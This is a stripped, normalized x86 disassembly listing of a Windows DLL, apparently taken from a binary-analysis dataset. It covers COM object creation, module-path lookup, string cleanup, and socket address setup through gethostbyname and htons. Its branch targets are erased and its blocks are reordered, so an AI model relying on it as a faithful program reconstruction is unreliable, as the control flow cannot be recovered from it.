mov ecx eax
mov eax [ edx + 0x18 ]
jmp eax
mov eax 0x1
retn
sub_10003000
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x0
call edx
cmp [ ebp + 0xc ] eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
pop esi
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
push ecx
mov ecx eax
call edx
sub_10003040
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c80d
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_100030e0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
mov edi eax
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
mov ecx esi
cmp eax 0x2
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov ebx eax
mov eax [ edx + 0xc ]
mov esi [ ebx ]
mov ecx edi
call eax
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ esi + 0x24 ]
push eax
mov ecx ebx
call edx
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov ecx [ esi + 0x8 ]
mov ebx [ ecx ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
push 0x3
call eax
mov ecx [ esi + 0x8 ]
mov edx [ ebx + 0x18 ]
push eax
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
mov ecx [ esi + 0x8 ]
mov ebx [ ecx ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
push 0x3
call eax
mov ecx [ esi + 0x8 ]
mov edx [ ebx + 0x18 ]
push eax
call edx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push esi
call edx
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_100031c0
push ebp
mov ebp esp
mov eax 0x10008
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov edx [ esi ]
push edi
mov [ ebp - 0x10008 ] eax
mov eax [ edx + 0x8 ]
push 0x1
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x18 ]
call eax
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
call eax
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
call eax
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
mov edi [ ebp + 0xc ]
cmp edi eax
jbe r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
mov edi [ ecx ]
mov eax [ edx + 0x8 ]
push 0x1
push 0x1
mov ecx esi
call eax
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x18 ]
push eax
call edx
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
mov edx [ edx + 0x20 ]
push 0x10000
lea ecx [ ebp - 0x10004 ]
push ecx
mov ecx eax
call edx
test eax eax
je r-xdata
add esi 0x10
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edi eax
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
lea eax [ ebp - 0x10004 ]
push eax
call edx
mov edi eax
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
mov ecx edi
cmp eax 0x2
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
call eax
call sub_10002e90
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi ]
mov edx [ eax + 0xc ]
call edx
push eax
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
lea ecx [ esi + 0x10 ]
call sub_10002a60
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x18 ]
call eax
test eax eax
jne r-xdata
push edi
push eax
mov eax [ ebp - 0x10008 ]
push eax
call sub_10018b70
add esp 0xc
mov eax edi
xor ecx ecx
call sub_10002b40
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
sub_10003380
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
push ebx
mov ebx ecx
je r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push ebx
call eax
dec eax
jne r-xdata
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x1c ] eax
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
test eax eax
je r-xdata
xor eax eax
push edi
mov edi eax
call sub_100033e0
pop edi
pop ebx
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
push edi
mov edi eax
call sub_100033e0
pop edi
pop ebx
pop ebp
retn 0x8
sub_100033e0
mov eax [ edi ]
mov edx [ eax + 0x1c ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x1c ]
mov ecx edi
call edx
test eax eax
je r-xdata
xor eax eax
retn
cmp [ ebx + 0x1c ] 0x0
jbe r-xdata
cmp [ ebx + 0x20 ] 0x10
mov ecx [ ebx + 0x1c ]
push esi
lea esi [ ebx + 0xc ]
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ edi ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx edi
call eax
mov eax [ ebx + 0x1c ]
xor ecx ecx
call sub_10002b40
mov eax 0x1
pop esi
retn
sub_10003430
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cfeb
mov eax [ fs : 0x0 ]
push eax
mov eax 0x4010
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push ecx
push edi
mov [ ebp - 0x401c ] edi
mov esi edx
mov [ ebp - 0x4018 ] eax
call sub_10001220
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ edi ] r--data
mov [ edi + 0x20 ] 0xf
mov [ edi + 0x1c ] edx
mov [ edi + 0xc ] dl
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
mov ecx [ ecx ]
mov [ ebp - 0x4014 ] ecx
mov [ ebp - 0x4014 ] edx
jmp r-xdata
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push 0xff
push edi
call edx
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
lea ecx [ ecx ]
mov ecx [ ebp - 0x4018 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
mov ecx [ ebp - 0x4014 ]
push ecx
mov ecx eax
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
test eax eax
je r-xdata
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
push eax
lea eax [ ebp - 0x4010 ]
lea ecx [ edi + 0xc ]
call sub_10002a60
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
xor esi esi
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov esi eax
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x20 ]
push 0x4000
lea ecx [ ebp - 0x4010 ]
push ecx
mov ecx esi
call edx
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x1c ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x1c ]
mov ecx esi
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x1c ]
mov ecx esi
call eax
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push edi
call eax
jmp r-xdata
cmp [ edi + 0x20 ] 0x10
jb r-xdata
lea eax [ edi + 0xc ]
mov eax [ edi + 0xc ]
jmp r-xdata
mov edx [ esi ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx esi
call eax
mov eax [ edi + 0x1c ]
xor ecx ecx
lea esi [ edi + 0xc ]
call sub_10002b40
sub_100035e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d36b
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x4
ja r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
call eax
cmp [ ebp + 0xc ] eax
jne r-xdata
jmp [ edi * 4 + jump_table_100037cc ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
mov edi [ ebp + 0xc ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
mov ecx edi
call edx
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov ebx [ ebp + 0xc ]
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push edi
push edi
xor ebx ebx
call sub_100012f0
mov edi eax
mov esi ebx
call sub_100037e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
push edi
mov ebx eax
call sub_100012f0
mov edi eax
mov esi ebx
call sub_100037e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edi edi
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edi eax
jmp r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ebx ]
mov edi eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
call eax
cmp ebx eax
jne r-xdata
xor ebx ebx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov ebx eax
jmp r-xdata
xor eax eax
mov esi eax
call sub_100037e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov esi eax
call sub_100037e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
jmp r-xdata
mov ecx [ esi + 0x8 ]
push edi
mov edx ebx
mov edi eax
call sub_10003430
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
push edi
call eax
push 0x28
call sub_10012ca7
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call eax
sub_100037e0
push ebp
mov ebp esp
mov eax 0x10004
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax + 0x1c ]
mov ecx edi
call edx
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x20 ]
push 0x10000
lea ecx [ ebp - 0x10004 ]
push ecx
mov ecx esi
call edx
test eax eax
je r-xdata
mov edx [ edi ]
mov edx [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x10004 ]
push eax
mov ecx edi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
sub_10003860
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cfaa
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
push ebx
call sub_10001220
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x10 ]
mov [ ebx ] r--data
test esi esi
je r-xdata
push r--data
lea ecx [ ebp + 0x10 ]
push ecx
mov [ ebp + 0x10 ] 0x20005
call sub_10013848
int3
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ ecx ]
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
push esi
call eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
cmp edx 0x1
ja r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
push edi
call eax
mov ecx [ ebx + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
push 0xffff
push ebx
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ esi ]
mov edi eax
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov esi eax
call sub_100037e0
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov edi eax
mov eax [ edx + 0x8 ]
call eax
mov esi eax
call sub_100037e0
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_100039a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bffb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x8
mov [ ebp - 0x4 ] 0x0
call sub_10012ca7
mov edi eax
add esp 0x4
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x1
test edi edi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push edi
call sub_10003aa0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
call sub_10012ca7
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor esi esi
mov [ rw-data ] esi
push 0x0
call [ CoInitialize@IAT ]
push edi
mov [ rw-data ] esi
call sub_10003aa0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10003a70
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
xor eax eax
cmp [ ebp - 0x4 ] ax
sete al
mov esp ebp
pop ebp
retn
sub_10003aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bfc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push r--data
xor esi esi
push 0x1
push esi
mov [ ebp - 0x4 ] esi
push r--data
mov [ edi ] r--data
mov [ ebp - 0x10 ] esi
call [ CoCreateInstance@IAT ]
cmp eax esi
jge r-xdata
mov eax [ ebp - 0x10 ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov edx [ eax ]
mov edx [ edx + 0x1c ]
push ecx
push eax
call edx
cmp eax esi
jge r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] 0x10006
call sub_10013848
mov eax [ ebp - 0x14 ]
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x2
lea ecx [ edi + 0x4 ]
mov [ ecx ] 0x0
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
test eax eax
js r-xdata
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] 0x10006
call sub_10013848
mov [ ebp - 0x4 ] 0x1
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push esi
call eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx ]
mov edx [ ecx + 0x8 ]
push ebx
call edx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10003b90
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10003c00
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf4c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x11c ]
xor ebx ebx
mov [ ebp - 0x11c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x50 ]
call eax
cmp eax ebx
jl r-xdata
xor eax eax
push 0x103
lea ecx [ ebp - 0x114 ]
push ecx
push ebx
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x11 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
dec eax
cmp eax ebx
jl r-xdata
lea ebx [ ebp - 0x114 ]
lea esi [ ebp + eax - 0x113 ]
call sub_10006e30
mov ebx esi
mov edi eax
call sub_10006e30
mov esi eax
mov [ ebp - 0x124 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x12c ] esi
lea edx [ ebp - 0x118 ]
push edx
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] 0x1
push r--data
mov [ ebp - 0x118 ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
mov cl 0x5c
mov ebx [ ebp - 0x118 ]
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
mov ecx [ eax + 0x48 ]
push 0x1
push ebx
call ecx
mov eax [ ebp - 0x118 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x20 ]
call eax
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x28 ]
push edi
push eax
call edx
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x30 ]
push 0x0
push eax
call edx
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x38 ]
push 0x0
push eax
call edx
mov eax [ ebp - 0x11c ]
mov edx [ ebp - 0x118 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
cmp esi ebx
je r-xdata
dec eax
jns r-xdata
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebx ]
mov edx [ ecx + 0x8 ]
push ebx
call edx
mov ebx [ SysFreeString@IAT ]
test esi esi
je r-xdata
mov eax [ ebp - 0x11c ]
lea edx [ ebp - 0x120 ]
push edx
mov [ ebp - 0x120 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
mov eax [ ebp - 0x120 ]
js r-xdata
cmp edi ebx
je r-xdata
push esi
call [ SysFreeString@IAT ]
cmp [ ebp + eax - 0x114 ] cl
je r-xdata
test edi edi
je r-xdata
push esi
call ebx
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
test eax eax
je r-xdata
push edi
call [ SysFreeString@IAT ]
jmp r-xdata
push edi
call ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov ecx [ eax + 0x8 ]
push ebx
call ecx
mov ebx [ SysFreeString@IAT ]
test esi esi
je r-xdata
test edi edi
je r-xdata
push esi
call ebx
mov eax 0x1
jmp r-xdata
push edi
call ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
sub_10003e30
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
xor eax eax
cmp [ ebp - 0x4 ] ax
setne al
mov esp ebp
pop ebp
retn
sub_10003ed0
push ebp
mov ebp esp
push eax
call [ gethostbyname@IAT ]
test eax eax
jne r-xdata
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push edi
push eax
call [ ntohl@IAT ]
mov ecx [ ebp + 0x8 ]
mov edi eax
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax 0x2
push ecx
mov [ esi + 0x4 ] ax
call [ htons@IAT ]
push edi
mov [ esi + 0x6 ] ax
call [ htonl@IAT ]
mov [ esi + 0x8 ] eax
pop edi
mov eax esi
pop ebp
retn
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax esi
pop ebp
retn
sub_10003f40
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10003f80
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cf73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov edx [ edi ]
movzx eax ax
push eax
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
lea esi [ ebp - 0x24 ]
call sub_10003ed0
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
push 0x0
mov eax esi
push eax
push 0x0
call edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
push 0x54
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push esi
push ebx
push eax
mov ecx edi
call sub_100042d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
sub_10004030
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
